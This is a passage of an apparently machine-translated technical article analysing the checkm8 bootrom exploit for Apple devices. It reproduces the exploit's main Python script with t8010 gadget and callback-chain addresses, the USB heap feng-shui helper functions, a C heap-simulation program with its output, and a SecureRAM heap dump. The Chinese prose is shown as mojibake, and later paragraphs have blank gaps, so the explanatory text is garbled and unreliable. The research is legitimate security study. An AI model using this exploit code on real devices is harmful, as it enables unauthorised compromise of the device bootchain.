æœ‰æ•ˆè´Ÿè½½çš„è¿‡ç¨‹ï¼Œå¯ä»¥åœ¨åŸå§‹çš„<code>checkm8.py</code>æ–‡ä»¶ä¸­æ‰¾åˆ°å®ƒã€‚ äº†è§£å…¶ä»–è®¾å¤‡çš„ç‰ˆæœ¬ä¹‹é—´çš„å·®å¼‚åº”è¯¥ä¸éš¾ã€‚ </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python from checkm8 import * def main(): print '*** checkm8 exploit by axi0mX ***' device = dfu.acquire_device(1800) start = time.time() print 'Found:', device.serial_number if 'PWND:[' in device.serial_number: print 'Device is already in pwned DFU Mode. Not executing exploit.' return payload, _ = exploit_config(device.serial_number) t8010_nop_gadget = 0x10000CC6C callback_chain = 0x1800B0800 t8010_overwrite = '\0' * 0x5c0 t8010_overwrite += struct.pack('&lt;32x2Q', t8010_nop_gadget, callback_chain) # heap feng-shui stall(device) leak(device) for i in range(6): no_leak(device) dfu.usb_reset(device) dfu.release_device(device) # set global state and restart usb device = dfu.acquire_device() device.serial_number libusb1_async_ctrl_transfer(device, 0x21, 1, 0, 0, 'A' * 0x800, 0.0001) libusb1_no_error_ctrl_transfer(device, 0x21, 4, 0, 0, 0, 0) dfu.release_device(device) time.sleep(0.5) # heap occupation device = dfu.acquire_device() device.serial_number stall(device) leak(device) leak(device) libusb1_no_error_ctrl_transfer(device, 0, 9, 0, 0, t8010_overwrite, 50) for i in range(0, len(payload), 0x800): libusb1_no_error_ctrl_transfer(device, 0x21, 1, 0, 0, payload[i:i+0x800], 50) dfu.usb_reset(device) dfu.release_device(device) device = dfu.acquire_device() if 'PWND:[checkm8]' not in device.serial_number: print 'ERROR: Exploit failed. Device did not enter pwned DFU Mode.' sys.exit(1) print 'Device is now in pwned DFU Mode.' print '(%0.2f seconds)' % (time.time() - start) dfu.release_device(device) if __name__ == '__main__': main()</span></span></code> </pre> <br><p>  <code>checkm8</code>å·¥ä½œå¯ä»¥åˆ†ä¸ºå‡ ä¸ªé˜¶æ®µï¼š </p><br><ol><li> å †å‡†å¤‡ï¼ˆ <code>heap feng-shui</code> ï¼‰ </li><li> åœ¨ä¸æ¸…é™¤å…¨å±€çŠ¶æ€çš„æƒ…å†µä¸‹åˆ†é…å’Œé‡Šæ”¾<code>IO</code>ç¼“å†²åŒº </li><li>  <code>use-after-free</code>è¦†ç›–åŠŸèƒ½è¦†ç›–<code>usb_device_io_request</code> </li><li> æœ‰æ•ˆè´Ÿè½½æ”¾ç½® </li><li>  <code>callback-chain</code>æ‰§è¡Œ </li><li>  <code>shellcode</code>æ‰§è¡Œ </li></ol><br><p> è¯¦ç»†è€ƒè™‘æ¯ä¸ªé˜¶æ®µã€‚ </p><br><h2 id="1-podgotovka-kuchi-heap-feng-shui">  1.å †å‡†å¤‡ï¼ˆå †é£æ°´ï¼‰ </h2><br><p> åœ¨æˆ‘ä»¬çœ‹æ¥ï¼Œè¿™æ˜¯æœ€æœ‰è¶£çš„é˜¶æ®µï¼Œæˆ‘ä»¬å¯¹æ­¤æ ¼å¤–æ³¨æ„ã€‚ </p><br><pre> <code class="python hljs">stall(device) leak(device) <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> i <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> range(<span class="hljs-number"><span class="hljs-number">6</span></span>): no_leak(device) dfu.usb_reset(device) dfu.release_device(device)</code> </pre> <br><p> æ­¤æ­¥éª¤å¯¹äºå®ç°<code>use-after-free</code>æ“ä½œçš„ä¾¿åˆ©å †çŠ¶æ€æ˜¯å¿…éœ€çš„ã€‚ é¦–å…ˆï¼Œè¯·è€ƒè™‘è°ƒç”¨<code>stall</code> ï¼Œ <code>leak</code> ï¼Œ <code>no_leak</code> ï¼š </p><br><pre> <code class="python hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">stall</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_async_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-string"><span class="hljs-string">'A'</span></span> * <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">0.00001</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC0</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">def</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">no_leak</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(device)</span></span></span><span class="hljs-function">:</span></span> libusb1_no_error_ctrl_transfer(device, <span class="hljs-number"><span class="hljs-number">0x80</span></span>, <span class="hljs-number"><span class="hljs-number">6</span></span>, <span class="hljs-number"><span class="hljs-number">0x304</span></span>, <span class="hljs-number"><span class="hljs-number">0x40A</span></span>, <span class="hljs-number"><span class="hljs-number">0xC1</span></span>, <span class="hljs-number"><span class="hljs-number">1</span></span>)</code> </pre> <br><p>  <code>libusb1_no_error_ctrl_transfer</code>æ˜¯<code>libusb1_no_error_ctrl_transfer</code>çš„åŒ…è£…ï¼Œå…¶ä¸­å¿½ç•¥äº†æ‰§è¡Œè¯·æ±‚æ—¶å‘ç”Ÿçš„ä»»ä½•å¼‚å¸¸ã€‚  <code>libusb1_async_ctrl_transfer</code> - <code>libusb</code>çš„<code>libusb_submit_transfer</code>å‡½æ•°çš„åŒ…è£…ï¼Œç”¨äºå¼‚æ­¥æŸ¥è¯¢æ‰§è¡Œã€‚ </p><br><p> è¿™ä¸¤ä¸ªè°ƒç”¨å‡æ¥å—ä»¥ä¸‹å‚æ•°ï¼š </p><br><ul><li> è®¾å¤‡å®ä¾‹ </li><li>  <code>SETUP</code>åŒ…çš„æ•°æ®ï¼ˆå®ƒä»¬çš„æè¿°åœ¨<a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=zh-CN&amp;u=">æ­¤å¤„</a> ï¼‰ï¼š <br><ul><li> <code>bmRequestType</code> </li> <li> <code>bRequest</code> </li> <li> <code>wValue</code> </li> <li> <code>wIndex</code> </li> </ul></li><li> æ•°æ®å¤§å°ï¼ˆ <code>wLength</code> ï¼‰æˆ–<code>Data Stage</code> </li><li> è¯·æ±‚è¶…æ—¶ </li></ul><br><p> å‚æ•°<code>bmRequestType</code> ï¼Œ <code>bRequest</code> ï¼Œ <code>wValue</code>å’Œ<code>wIndex</code>å¯¹äºè¿™ä¸‰ç§æŸ¥è¯¢éƒ½æ˜¯é€šç”¨çš„ã€‚ ä»–ä»¬çš„æ„æ€æ˜¯ï¼š </p><br><ul><li> <code>bmRequestType = 0x80</code> <br> <ul><li>  <code>0b1XXXXXXX</code> <code>Data Stage</code>ä»è®¾å¤‡åˆ°ä¸»æœºï¼ˆè®¾å¤‡åˆ°ä¸»æœºï¼‰çš„æ–¹å‘ </li><li>  <code>0bX00XXXXX</code>æ ‡å‡†è¯·æ±‚ç±»å‹ </li><li>  <code>0bXXX00000</code>è¯·æ±‚çš„æ¥æ”¶è€…-è®¾å¤‡ </li></ul></li><li>  <code>bRequest = 6</code>è¯·æ±‚æè¿°ç¬¦ï¼ˆ <code>GET_DESCRIPTOR</code> ï¼‰ </li><li> <code>wValue = 0x304</code> <br> <ul><li>  <code>wValueHigh = 0x3</code>ç¡®å®šè¦æ¥æ”¶çš„æè¿°ç¬¦çš„ç±»å‹-å­—ç¬¦ä¸²ï¼ˆ <code>USB_DT_STRING</code> ï¼‰ </li><li>  <code>wValueLow = 0x4</code>æ˜¯å­—ç¬¦ä¸²æè¿°ç¬¦çš„ç´¢å¼•ï¼Œ4å¯¹åº”äºè®¾å¤‡çš„åºåˆ—å·ï¼ˆåœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå­—ç¬¦ä¸²çœ‹èµ·æ¥åƒ<code>CPID:8010 CPRV:11 CPFM:03 SCEP:01 BDID:0C ECID:001A40362045E526 IBFL:3C SRTG:[iBoot-2696.0.0.1.33]</code> ï¼‰ </li></ul></li><li>  <code>wIndex = 0x40A</code>å­—ç¬¦ä¸²è¯­è¨€çš„æ ‡è¯†ç¬¦ï¼Œå…¶å€¼å¯¹äºæ“ä½œå¹¶ä¸é‡è¦ï¼Œå¯ä»¥æ›´æ”¹ã€‚ </li></ul><br><p> å¯¹äºè¿™ä¸‰ä¸ªè¯·æ±‚ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œåœ¨å †ä¸Šéƒ½ä¼šä¸ºä»¥ä¸‹ç»“æ„çš„å¯¹è±¡åˆ†é…0x30å­—èŠ‚ï¼š </p><br><p><img src="https://habrastorage.org/webt/-e/ub/wb/-eubwbh-2fhsjb9bs36t0qom7be.png"></p><br><p> è¯¥å¯¹è±¡æœ€æœ‰è¶£çš„å­—æ®µæ˜¯<code>callback</code>å’Œ<code>next</code> ã€‚ </p><br><ul><li>  <code>callback</code>æŒ‡å‘åœ¨è¯·æ±‚å®Œæˆæ—¶å°†è¢«è°ƒç”¨çš„å‡½æ•°çš„æŒ‡é’ˆã€‚ </li><li>  <code>next</code>æŒ‡å‘ç›¸åŒç±»å‹çš„ä¸‹ä¸€ä¸ªå¯¹è±¡çš„æŒ‡é’ˆï¼Œå¯¹äºæ’é˜Ÿè¯·æ±‚æ˜¯å¿…éœ€çš„ã€‚ </li></ul><br><p> è°ƒç”¨<code>stall</code>å…³é”®åŠŸèƒ½æ˜¯ä½¿ç”¨è¯·æ±‚çš„å¼‚æ­¥æ‰§è¡Œï¼Œå¹¶ä»¥æœ€å°çš„è¶…æ—¶æ—¶é—´è¿›è¡Œã€‚ å› æ­¤ï¼Œå¦‚æœå¹¸è¿çš„è¯ï¼Œè¯¥è¯·æ±‚å°†åœ¨OSçº§åˆ«è¢«å–æ¶ˆï¼Œå¹¶å°†ä¿ç•™åœ¨æ‰§è¡Œé˜Ÿåˆ—ä¸­ï¼Œå¹¶ä¸”äº‹åŠ¡å°†æ— æ³•å®Œæˆã€‚ åŒæ—¶ï¼Œè®¾å¤‡å°†ç»§ç»­æ¥å—æ‰€æœ‰ä¼ å…¥çš„<code>SETUP</code>æ•°æ®åŒ…ï¼Œå¹¶åœ¨å¿…è¦æ—¶å°†å…¶æ”¾å…¥æ‰§è¡Œé˜Ÿåˆ—ä¸­ã€‚ åæ¥ï¼Œé€šè¿‡ä½¿ç”¨<code>Arduino</code>ä¸Šçš„<code>USB</code>è¿›è¡Œå®éªŒ<code>Arduino</code>æˆ‘ä»¬å‘ç°ä¸»æœºå¿…é¡»å‘é€<code>SETUP</code>æ•°æ®åŒ…å’Œ<code>IN</code>ä»¤ç‰Œæ‰èƒ½æˆåŠŸæ“ä½œï¼Œç„¶åå¿…é¡»é€šè¿‡è¶…æ—¶å–æ¶ˆäº‹åŠ¡ã€‚ åœ¨ç¤ºæ„å›¾ä¸Šï¼Œè¿™ç§ä¸å®Œæ•´çš„äº¤æ˜“å¯ä»¥è¡¨ç¤ºä¸ºï¼š </p><br><div style="text-align:center;"><img width="500" src="https://habrastorage.org/webt/sh/zq/ia/shzqiacghex3lk7jc9nhgoz3m7g.png"></div><br><p> å…¶ä½™è¯·æ±‚çš„é•¿åº¦ä»…ç›¸å·®ä¸€ã€‚ äº‹å®æ˜¯ï¼Œå¯¹äºæ ‡å‡†æŸ¥è¯¢ï¼Œå­˜åœ¨ä¸€ä¸ªæ ‡å‡†<code>callback</code> ï¼Œå¦‚ä¸‹æ‰€ç¤ºï¼š </p><br><p><img src="https://habrastorage.org/webt/cx/as/gn/cxasgnrqyant31ostgflo85zxro.png"></p><br><p>  <code>io_length</code>å€¼ç­‰äºè¯·æ±‚çš„<code>SETUP</code>æ•°æ®åŒ…ä¸­çš„<code>wLength</code>çš„æœ€å°å€¼å’Œæ‰€è¯·æ±‚æè¿°ç¬¦çš„åŸå§‹é•¿åº¦ã€‚ ç”±äºæè¿°ç¬¦è¶³å¤Ÿé•¿ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥å°†<code>io_length</code>å€¼ç²¾ç¡®æ§åˆ¶åœ¨å…¶é•¿åº¦å†…ã€‚  <code>g_setup_request.wLength</code>çš„å€¼ç­‰äºæœ€åä¸€ä¸ª<code>SETUP</code>æ•°æ®åŒ…çš„<code>wLength</code>çš„å€¼ï¼Œåœ¨è¿™ç§æƒ…å†µä¸‹ä¸º<code>0xC1</code> ã€‚ </p><br><p> å› æ­¤ï¼Œåœ¨ä½¿ç”¨<code>stall</code>å’Œ<code>leak</code>è°ƒç”¨ç”Ÿæˆçš„æŸ¥è¯¢å®Œæˆæ—¶ï¼Œæ»¡è¶³äº†æœ€ç»ˆ<code>callback</code>å‡½æ•°ä¸­çš„æ¡ä»¶ï¼Œå¹¶<code>usb_core_send_zlp()</code> ã€‚ è¯¥è°ƒç”¨ä»…åˆ›å»ºä¸€ä¸ª<code>zero-length-packet</code> ï¼Œå¹¶å°†å…¶æ·»åŠ åˆ°æ‰§è¡Œé˜Ÿåˆ—ä¸­ã€‚ è¿™å¯¹äºåœ¨<code>Status Stage</code>æ­£ç¡®å®Œæˆäº‹åŠ¡æ˜¯å¿…è¦çš„ã€‚ </p><br><p> è¯¥è¯·æ±‚ä»¥å¯¹<code>usb_core_complete_endpoint_io</code>å‡½æ•°çš„è°ƒç”¨ç»“æŸï¼Œè¯¥å‡½æ•°é¦–å…ˆè°ƒç”¨<code>callback</code> ï¼Œç„¶åé‡Šæ”¾è¯·æ±‚å†…å­˜ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè¯·æ±‚çš„å®Œæˆä¸ä»…å¯ä»¥åœ¨æ•´ä¸ªäº‹åŠ¡å®é™…å®Œæˆæ—¶å‘ç”Ÿï¼Œè€Œä¸”å¯ä»¥åœ¨é‡ç½®<code>USB</code>æ—¶å‘ç”Ÿã€‚ æ”¶åˆ°<code>USB</code>é‡ç½®ä¿¡å·åï¼Œè¯·æ±‚é˜Ÿåˆ—å°†è¢«ç»•è¿‡ï¼Œå¹¶ä¸”æ¯ä¸ªè¯·æ±‚é˜Ÿåˆ—éƒ½å°†å®Œæˆã€‚ </p><br><p> ç”±äºå¯¹<code>usb_core_send_zlp()</code>çš„é€‰æ‹©æ€§è°ƒç”¨ï¼Œç»•è¿‡äº†è¯·æ±‚é˜Ÿåˆ—ç„¶åé‡Šæ”¾äº†å®ƒä»¬ï¼Œå› æ­¤æ‚¨å¯ä»¥å®ç°è¶³å¤Ÿçš„å †æ§åˆ¶ï¼Œä»¥è¿›è¡Œé‡Šæ”¾<code>use-after-free</code>æ“ä½œã€‚ é¦–å…ˆï¼Œè®©æˆ‘ä»¬çœ‹ä¸€ä¸‹å‘å¸ƒå‘¨æœŸæœ¬èº«ï¼š </p><br><p><img src="https://habrastorage.org/webt/ik/tn/ym/iktnymzi4lywmtf1xsmcfsgpyb4.png"></p><br><p> é¦–å…ˆæ¸…é™¤è¯·æ±‚é˜Ÿåˆ—ï¼Œç„¶åå¯¹å–æ¶ˆçš„è¯·æ±‚è¿›è¡Œ<code>usb_core_complete_endpoint_io</code> ï¼Œå¹¶é€šè¿‡è°ƒç”¨<code>usb_core_complete_endpoint_io</code>å®Œæˆ<code>usb_core_complete_endpoint_io</code> ã€‚ åŒæ—¶ï¼Œå°†ä½¿ç”¨<code>usb_core_send_zlp</code>é€‰æ‹©çš„è¯·æ±‚æ”¾ç½®åœ¨<code>ep-&gt;io_head</code> ã€‚  <code>USB</code>é‡ç½®è¿‡ç¨‹å®Œæˆåï¼Œæœ‰å…³ç«¯ç‚¹çš„æ‰€æœ‰ä¿¡æ¯éƒ½å°†è¢«é‡ç½®ï¼ŒåŒ…æ‹¬<code>io_head</code>å’Œ<code>io_tail</code> ï¼Œé›¶é•¿åº¦è¯·æ±‚å°†ä¿ç•™åœ¨å †ä¸­ã€‚ å› æ­¤ï¼Œæ‚¨å¯ä»¥åœ¨å †å…¶ä½™éƒ¨åˆ†çš„ä¸­é—´åˆ›å»ºä¸€ä¸ªå°çš„å—ã€‚ ä¸‹å›¾æ˜¾ç¤ºäº†è¿™ç§æƒ…å†µï¼š </p><br><p><img src="https://habrastorage.org/webt/jl/rj/v5/jlrjv55cw23fehubgo7hsqmv68w.png"></p><br><p>  <code>SecureROM</code>çš„å †çš„è®¾è®¡æ–¹å¼æ˜¯ä»åˆé€‚çš„æœ€å°å¤§å°çš„ç©ºé—²å—ä¸­åˆ†é…ä¸€ä¸ªæ–°çš„å­˜å‚¨åŒºã€‚ é€šè¿‡ä¸Šè¿°æ–¹æ³•åˆ›å»ºä¸€ä¸ªå°çš„ç©ºé—²å—ï¼Œå¯ä»¥å½±å“<code>USB</code>åˆå§‹åŒ–æœŸé—´çš„å†…å­˜åˆ†é…ä»¥åŠ<code>io_buffer</code>å’Œè¯·æ±‚çš„åˆ†é…ã€‚ </p><br><p> ä¸ºäº†æ›´å¥½åœ°ç†è§£ï¼Œè®©æˆ‘ä»¬æ‰¾å‡ºåœ¨<code>DFU</code>åˆå§‹åŒ–æœŸé—´å‘ç”Ÿäº†å“ªäº›å †è¯·æ±‚ã€‚ åœ¨åˆ†æ<code>iBoot</code>æºä»£ç å’Œ<code>iBoot</code>é€†å‘å·¥ç¨‹çš„è¿‡ç¨‹ä¸­<code>SecureROM</code>æˆ‘ä»¬è®¾æ³•è·å¾—äº†ä»¥ä¸‹é¡ºåºï¼š </p><br><ul><li><ol><li> åˆ†é…å„ç§å­—ç¬¦ä¸²æè¿°ç¬¦ <br><ul><li>  1.1ã€‚  <code>Nonce</code> ï¼ˆå¤§å°<code>234</code> ï¼‰ </li><li>  1.2ã€‚  <code>Manufacturer</code> ï¼ˆ <code>22</code> ï¼‰ </li><li>  1.3ã€‚  <code>Product</code> ï¼ˆ <code>62</code> ï¼‰ </li><li>  1.4ã€‚  <code>Serial Number</code> ï¼ˆ <code>198</code> ï¼‰ </li><li>  1.5ã€‚  <code>Configuration string</code> ï¼ˆ <code>62</code> ï¼‰ </li></ul></li></ol><br></li><li><ol><li> ä¸åˆ›å»º<code>USB</code>ä»»åŠ¡ç›¸å…³çš„åˆ†é… <br><ul><li>  2.1ã€‚ ä»»åŠ¡ç»“æ„ï¼ˆ <code>0x3c0</code> ï¼‰ </li><li>  2.2ã€‚ å †æ ˆä»»åŠ¡ï¼ˆ <code>0x1000</code> ï¼‰ </li></ul></li></ol><br></li><li><ol><li>  <code>io_buffer</code> ï¼ˆ <code>0x800</code> ï¼‰ </li></ol><br></li><li><ol><li> é…ç½®æè¿°ç¬¦ <br><ul><li>  4.1ã€‚  <code>High-Speed</code> ï¼ˆ <code>25</code> ï¼‰ </li><li>  4.2ã€‚  <code>Full-Speed</code> ï¼ˆ <code>25</code> ï¼‰ </li></ul></li></ol><br></li></ul><br><p> ç„¶åæ˜¯è¯·æ±‚ç»“æ„çš„åˆ†é…ã€‚ å¦‚æœå †ç©ºé—´çš„ä¸­é—´æœ‰ä¸€ä¸ªå°å—ï¼Œåˆ™ç¬¬ä¸€ç±»çš„ä¸€äº›åˆ†é…å°†è¿›å…¥è¯¥å—ï¼Œæ‰€æœ‰å…¶ä»–åˆ†é…å°†ç§»åŠ¨ï¼Œå› æ­¤æˆ‘ä»¬å¯èƒ½ä¼šæº¢å‡º<code>usb_device_io_request</code> ï¼Œè¿™æ˜¯æŒ‡æ—§ç¼“å†²åŒºã€‚ å¯ä»¥ç”¨ä»¥ä¸‹æ–¹å¼è¡¨ç¤ºï¼š </p><br><p><img src="https://habrastorage.org/webt/on/dl/dy/ondldygtgie2sho2l8xh8q5mlva.png"></p><br><p> ä¸ºäº†è®¡ç®—å¿…è¦çš„åå·®ï¼Œæˆ‘ä»¬å†³å®šç®€å•åœ°æ¨¡æ‹Ÿä¸Šé¢åˆ—å‡ºçš„åˆ†é…ï¼Œç•¥å¾®ä¿®æ”¹<code>iBoot</code>å †çš„æºä»£ç ã€‚ </p><br><div class="spoiler">  <b class="spoiler_title">DFUå †ä»¿çœŸ</b> <div class="spoiler_text"><pre> <code class="cpp hljs"><span class="hljs-meta"><span class="hljs-meta">#</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">"heap.h"</span></span></span><span class="hljs-meta"> #</span><span class="hljs-meta-keyword"><span class="hljs-meta"><span class="hljs-meta-keyword">include</span></span></span><span class="hljs-meta"> </span><span class="hljs-meta-string"><span class="hljs-meta"><span class="hljs-meta-string">&lt;stdio.h&gt; #include &lt;unistd.h&gt; #include &lt;sys/mman.h&gt; #ifndef NOLEAK #define NOLEAK (8) #endif int main() { void * chunk = mmap((void *)0x1004000, 0x100000, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0); printf("chunk = %p\n", chunk); heap_add_chunk(chunk, 0x100000, 1); malloc(0x3c0); //        SecureRAM void * descs[10]; void * io_req[100]; descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); const int N = NOLEAK; void * task = malloc(0x3c0); void * task_stack = malloc(0x4000); void * io_buf_0 = memalign(0x800, 0x40); void * hs = malloc(25); void * fs = malloc(25); void * zlps[2]; for(int i = 0; i &lt; N; i++) { io_req[i] = malloc(0x30); } for(int i = 0; i &lt; N; i++) { if(i &lt; 2) { zlps[i] = malloc(0x30); } free(io_req[i]); } for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_0); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 2; i++) { printf("zlps[%d] = %p\n", i, zlps[i]); } printf("**********\n"); for(int i = 0; i &lt; 5; i++) { free(descs[i]); } free(task); free(task_stack); free(io_buf_0); free(hs); free(fs); descs[0] = malloc(234); descs[1] = malloc(22); descs[2] = malloc(62); descs[3] = malloc(198); descs[4] = malloc(62); task = malloc(0x3c0); task_stack = malloc(0x4000); void * io_buf_1 = memalign(0x800, 0x40); hs = malloc(25); fs = malloc(25); for(int i = 0; i &lt; 5; i++) { printf("descs[%d] = %p\n", i, descs[i]); } printf("task = %p\n", task); printf("task_stack = %p\n", task_stack); printf("io_buf = %p\n", io_buf_1); printf("hs = %p\n", hs); printf("fs = %p\n", fs); for(int i = 0; i &lt; 5; i++) { io_req[i] = malloc(0x30); printf("io_req[%d] = %p\n", i, io_req[i]); } printf("**********\n"); printf("io_req_off = %#lx\n", (int64_t)io_req[0] - (int64_t)io_buf_0); printf("hs_off = %#lx\n", (int64_t)hs - (int64_t)io_buf_0); printf("fs_off = %#lx\n", (int64_t)fs - (int64_t)io_buf_0); return 0; }</span></span></span></span></code> </pre> </div></div><br><p> åœ¨<code>heap feng-shui</code>é˜¶æ®µæœ‰8ä¸ªè¯·æ±‚çš„ç¨‹åºè¾“å‡ºï¼š </p><br><pre> <code class="plaintext hljs">chunk = 0x1004000 descs[0] = 0x1004480 descs[1] = 0x10045c0 descs[2] = 0x1004640 descs[3] = 0x10046c0 descs[4] = 0x1004800 task = 0x1004880 task_stack = 0x1004c80 io_buf = 0x1008d00 hs = 0x1009540 fs = 0x10095c0 zlps[0] = 0x1009a40 zlps[1] = 0x1009640 ********** descs[0] = 0x10096c0 descs[1] = 0x1009800 descs[2] = 0x1009880 descs[3] = 0x1009900 descs[4] = 0x1004480 task = 0x1004500 task_stack = 0x1004900 io_buf = 0x1008980 hs = 0x10091c0 fs = 0x1009240 io_req[0] = 0x10092c0 io_req[1] = 0x1009340 io_req[2] = 0x10093c0 io_req[3] = 0x1009440 io_req[4] = 0x10094c0 ********** io_req_off = 0x5c0 hs_off = 0x4c0 fs_off = 0x540</code> </pre> <br><p> ä¸‹ä¸€ä¸ª<code>usb_device_io_request</code>å°†ä¸å‰ä¸€ä¸ªç¼“å†²åŒºçš„èµ·å§‹ä½ç½®åç§»<code>0x5c0</code> ï¼Œè¿™ä¸åˆ©ç”¨ä»£ç ç›¸å¯¹åº”ï¼š </p><br><pre> <code class="python hljs">t8010_overwrite = <span class="hljs-string"><span class="hljs-string">'\0'</span></span> * <span class="hljs-number"><span class="hljs-number">0x5c0</span></span> t8010_overwrite += struct.pack(<span class="hljs-string"><span class="hljs-string">'&lt;32x2Q'</span></span>, t8010_nop_gadget, callback_chain)</code> </pre> <br><p>       ,      <code>SecureRAM</code> ,      <code>checkm8</code> .     ,       .    ,    <code>usb_device_io_request</code>     ,       . </p><br><pre> <code class="python hljs"><span class="hljs-comment"><span class="hljs-comment">#!/usr/bin/env python3 import struct from hexdump import hexdump with open('HEAP', 'rb') as f: heap = f.read() cur = 0x4000 def parse_header(cur): _, _, _, _, this_size, t = struct.unpack('&lt;QQQQQQ', heap[cur:cur + 0x30]) is_free = t &amp; 1 prev_free = (t &gt;&gt; 1) &amp; 1 prev_size = t &gt;&gt; 2 this_size *= 0x40 prev_size *= 0x40 return this_size, is_free, prev_size, prev_free while True: try: this_size, is_free, prev_size, prev_free = parse_header(cur) except Exception as ex: break print('chunk at', hex(cur + 0x40)) if this_size == 0: if cur in (0x9180, 0x9200, 0x9280): #    this_size = 0x80 else: break print(hex(this_size), 'free' if is_free else 'non-free', hex(prev_size), prev_free) hexdump(heap[cur + 0x40:cur + min(this_size, 0x100)]) cur += this_size</span></span></code> </pre> <br><p>         . ,        . </p><br><div class="spoiler"> <b class="spoiler_title">    SecureRAM</b> <div class="spoiler_text"><pre> <code class="plaintext hljs">chunk at 0x4040 0x40 non-free 0x0 0 chunk at 0x4080 0x80 non-free 0x40 0 00000000: 00 41 1B 80 01 00 00 00 00 00 00 00 00 00 00 00 .A.............. 00000010: 00 00 00 00 00 00 00 00 00 01 00 00 00 00 00 00 ................ 00000020: FF 00 00 00 00 00 00 00 68 3F 08 80 01 00 00 00 ........h?...... 00000030: F0 F1 F2 F3 F4 F5 F6 F7 F8 F9 FA FB FC FD FE FF ................ chunk at 0x4100 0x140 non-free 0x80 0 00000000: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4240 0x240 non-free 0x140 0 00000000: 68 6F 73 74 20 62 72 69 64 67 65 00 00 00 00 00 host bridge..... 00000010: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000020: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000030: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000040: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000050: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000060: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000070: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000080: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 00000090: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000A0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ 000000B0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ................ chunk at 0x4480 // descs[4], conf string 0x80 non-free 0x240 0 00000000: 3E 03 41 00 70 00 70 00 6C 00 65 00 20 00 4D 00 &gt;.Apple .M. 00000010: 6F 00 62 00 69 00 6C 00 65 00 20 00 44 00 65 00 obile .De 00000020: 76 00 69 00 63 00 65 00 20 00 28 00 44 00 46 00 vice .(.DF 00000030: 55 00 20 00 4D 00 6F 00 64 00 65 00 29 00 FE FF U. .Mode)... chunk at 0x4500 // task 0x400 non-free 0x80 0 00000000: 6B 73 61 74 00 00 00 00 E0 01 08 80 01 00 00 00 ksat............ 00000010: E8 83 08 80 01 00 00 00 00 00 00 00 